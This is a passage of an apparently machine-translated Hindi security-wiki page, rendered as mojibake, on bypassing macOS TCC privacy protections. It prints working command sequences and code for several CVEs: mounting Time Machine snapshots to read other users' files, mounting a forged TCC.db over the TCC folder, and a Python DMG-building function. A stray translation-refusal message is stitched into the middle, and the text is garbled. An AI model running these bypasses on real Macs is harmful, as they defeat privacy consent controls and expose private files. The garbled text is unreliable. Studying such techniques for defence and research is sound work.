рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди /tmp рдЬреИрд╕реЗ рд╕реНрдерд╛рди рдкрд░ рдПрдХ рдЯрд░реНрдорд┐рдирд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд▓рд┐рдЦ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рд▓реЙрдиреНрдЪ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## рдорд╛рдЙрдВрдЯрд┐рдВрдЧ рджреНрд╡рд╛рд░рд╛

### CVE-2020-9771 - mount\_apfs TCC рдмрд╛рдИрдкрд╛рд╕ рдФрд░ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХреЗрд▓реЗрд╢рди

**рдХреЛрдИ рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** (рдЕрдирд╛рдзрд┐рдХреГрдд рд╡рд╛рд▓реЗ рднреА) рдПрдХ рдЯрд╛рдЗрдо рдорд╢реАрди рд╕реНрдиреИрдкрд╢реЙрдЯ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ рдорд╛рдЙрдВрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рд╕рднреА рдлрд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддрд╛ рд╣реИ** рдЬреЛ рдЙрд╕ рд╕реНрдиреИрдкрд╢реЙрдЯ рдореЗрдВ рд╣реИрдВред\
**рдХреЗрд╡рд▓ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░** рдЬреЛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ рд╡рд╣ рдпрд╣ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди (рдЬреИрд╕реЗ `Terminal`) рдХреЗ рдкрд╛рд╕ **рдкреВрд░реНрдг рдбрд┐рд╕реНрдХ рдПрдХреНрд╕реЗрд╕** (FDA) рдПрдХреНрд╕реЗрд╕ (`kTCCServiceSystemPolicyAllfiles`) рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕реЗ рдПрдХ рдПрдбрдорд┐рди рджреНрд╡рд╛рд░рд╛ рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдПред

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

рдПрдХ рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рд╡рд┐рд╡рд░рдг [**рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**](https://theevilbit.github.io/posts/cve_2020_9771/)**ред**

### CVE-2021-1784 & CVE-2021-30808 - TCC рдлрд╛рдЗрд▓ рдкрд░ рдорд╛рдЙрдВрдЯ рдХрд░рдирд╛

рднрд▓реЗ рд╣реА TCC DB рдлрд╛рдЗрд▓ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реЛ, рдирдИ TCC.db рдлрд╛рдЗрд▓ рдХреЛ **рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдкрд░ рдорд╛рдЙрдВрдЯ рдХрд░рдирд╛** рд╕рдВрднрд╡ рдерд╛:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
Since the provided text does not contain any content to translate, I cannot provide a translation. Please provide the relevant English text that needs to be translated into Hindi, and I will be happy to assist you.
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
рдкреВрд░реНрдг рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреА рдЬрд╛рдВрдЪ [**рдореВрд▓ рд▓реЗрдЦрди**](https://theevilbit.github.io/posts/cve-2021-30808/) рдореЗрдВ рдХрд░реЗрдВред

### asr

рдЯреВрд▓ **`/usr/sbin/asr`** рдкреВрд░реА рдбрд┐рд╕реНрдХ рдХреЛ рдХреЙрдкреА рдХрд░рдиреЗ рдФрд░ рдЙрд╕реЗ рджреВрд╕рд░реА рдЬрдЧрд╣ рдорд╛рдЙрдВрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рдерд╛, TCC рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рддреЗ рд╣реБрдПред

### рд╕реНрдерд╛рди рд╕реЗрд╡рд╛рдПрдВ

**`/var/db/locationd/clients.plist`** рдореЗрдВ рдПрдХ рддреАрд╕рд░рд╛ TCC рдбреЗрдЯрд╛рдмреЗрд╕ рд╣реИ рдЬреЛ **рд╕реНрдерд╛рди рд╕реЗрд╡рд╛рдУрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП** рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓реЗ рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕ рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИред\
**`/var/db/locationd/`** рдлреЛрд▓реНрдбрд░ DMG рдорд╛рдЙрдВрдЯрд┐рдВрдЧ рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рдерд╛ рдЗрд╕рд▓рд┐рдП рд╣рдо рдЕрдкрдиреА рдЦреБрдж рдХреА plist рдорд╛рдЙрдВрдЯ рдХрд░ рд╕рдХрддреЗ рдереЗред

## рд╕реНрдЯрд╛рд░реНрдЯрдЕрдк рдРрдкреНрд╕ рджреНрд╡рд╛рд░рд╛

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## grep рджреНрд╡рд╛рд░рд╛

рдХрдИ рдмрд╛рд░ рдлрд╛рдЗрд▓реЗрдВ рдИрдореЗрд▓, рдлреЛрди рдирдВрдмрд░, рд╕рдВрджреЗрд╢ рдЖрджрд┐ рдЬреИрд╕реА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╕реНрдерд╛рдиреЛрдВ рдкрд░ рд╕реНрдЯреЛрд░ рдХрд░рддреА рд╣реИрдВ (рдЬреЛ Apple рдореЗрдВ рдПрдХ рднреЗрджреНрдпрддрд╛ рдорд╛рдиреА рдЬрд╛рддреА рд╣реИ)ред

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## рд╕рд┐рдВрдереЗрдЯрд┐рдХ рдХреНрд▓рд┐рдХреНрд╕

рдпрд╣ рдЕрдм рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛, рд▓реЗрдХрд┐рди [**рдкрд╣рд▓реЗ рдХрд┐рдпрд╛ рдХрд░рддрд╛ рдерд╛**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics рдЗрд╡реЗрдВрдЯреНрд╕**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдФрд░ рддрд░реАрдХрд╛:

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## рд╕рдВрджрд░реНрдн

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
